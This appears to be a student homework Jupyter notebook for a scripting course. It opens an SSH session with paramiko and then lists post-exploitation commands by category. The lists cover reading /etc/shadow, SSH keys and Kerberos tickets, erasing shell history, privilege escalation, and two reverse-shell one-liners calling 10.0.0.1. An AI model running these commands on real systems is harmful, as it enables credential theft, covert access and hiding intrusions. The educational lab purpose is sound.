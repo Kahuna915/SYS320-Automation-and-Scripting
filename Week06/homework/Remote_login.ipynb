{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import paramiko\n",
    "from getpass import getpass\n",
    "\n",
    "# Create the password Prompt\n",
    "thePass = getpass(prompt='Please enter your SSH Password: ')\n",
    "\n",
    "# Host information\n",
    "host = \"192.168.74.130\"\n",
    "port = 22\n",
    "username = \"noah.stiles\"\n",
    "password = thePass\n",
    "\n",
    "try:\n",
    "    ssh = paramiko.SSHClient()\n",
    "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    ssh.connect(host, port, username, password)\n",
    "\n",
    "except paramiko.AuthenticationException:\n",
    "    print(\"Authentication Failed\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['uname -a', 'ps aux', 'top -n 1 -d', 'id', 'arch, uname -m']\n"
     ]
    }
   ],
   "source": [
    "blind_files = [\n",
    "    'cat /etc/resolv.conf'\n",
    "    'cat /etc/motd'\n",
    "    'cat /etc/issue'\n",
    "    'cat /etc/passwd'\n",
    "    'cat /etc/shadow'\n",
    "]\n",
    "system = [\n",
    "        'uname -a',\n",
    "        'ps aux',\n",
    "        'top -n 1 -d',\n",
    "        'id',\n",
    "        'arch, uname -m'\n",
    "        ]\n",
    "networking = [\n",
    "            'hostname -f'\n",
    "            'ip addr show'\n",
    "            'ip ro show'\n",
    "            'ifconfig -a'\n",
    "            'route -n'\n",
    "             ]\n",
    "user_accounts = [\n",
    "                'cat /etc/passwd'\n",
    "                'cat /etc/shadow'\n",
    "                'cat /etc/security/passwd'\n",
    "                'getent passwd'\n",
    "                'getent group'\n",
    "                ]\n",
    "user_info = [\n",
    "    'ls -alh /home/*/'\n",
    "    'ls -alh /home/*/.ssh/'\n",
    "    'cat /home/*/.ssh/authorized_keys'\n",
    "    'cat /home/*/.ssh/known_hosts'\n",
    "    'cat /home/*/.hist'\n",
    "]\n",
    "credentials = [\n",
    "    'cat /home/*/.ssh/id*'\n",
    "    'cat /tmp/krb5cc_*'\n",
    "    'cat /tmp/krb5.keytab'\n",
    "    'cat /home/*/.gnupg/secring.gpgs'\n",
    "]\n",
    "configuration = [\n",
    "    'cat /etc/issue{,.net}'\n",
    "    'cat /etc/master.passwd'\n",
    "    'cat /etc/group'\n",
    "    'cat /etc/hosts'\n",
    "    'cat /etc/syslog.conf'\n",
    "]\n",
    "distro = [\n",
    "    'uname -a'\n",
    "    'lsb_release -d'\n",
    "    'cat /etc/os-release'\n",
    "    'cat /etc/*release'\n",
    "]\n",
    "installed_packages = [\n",
    "    'yum list | grep installed'\n",
    "    'rpm -qa --last | head'\n",
    "]\n",
    "package_sources = [\n",
    "    'cat /etc/apt/sources.list'\n",
    "    'ls -l /etc/yum.repos.d/'\n",
    "    'cat /etc/yum.conf'\n",
    "]\n",
    "important_files = [\n",
    "    'ls -dlR */'\n",
    "    'find /var -type d'\n",
    "    'ls /home/*/id*'\n",
    "    'locate rhosts'\n",
    "    'ls -alhtr /home'\n",
    "]\n",
    "covering_tracks = [\n",
    "    'history -c'\n",
    "    'touch ~/.bash_history'\n",
    "    'tcsh% set history=0'\n",
    "    'bash$ set +o history'\n",
    "    'rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null'\n",
    "]\n",
    "escalating = [\n",
    "    'sudo -l'\n",
    "    'cat /etc/sudoers'\n",
    "    'cat /etc/shadow'\n",
    "    'cat /etc/master.passwd'\n",
    "    'ls /home/*/.ssh/*'\n",
    "]\n",
    "reverse_shell = [\n",
    "    'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'\n",
    "    'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'\n",
    "    ''\n",
    "]\n"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}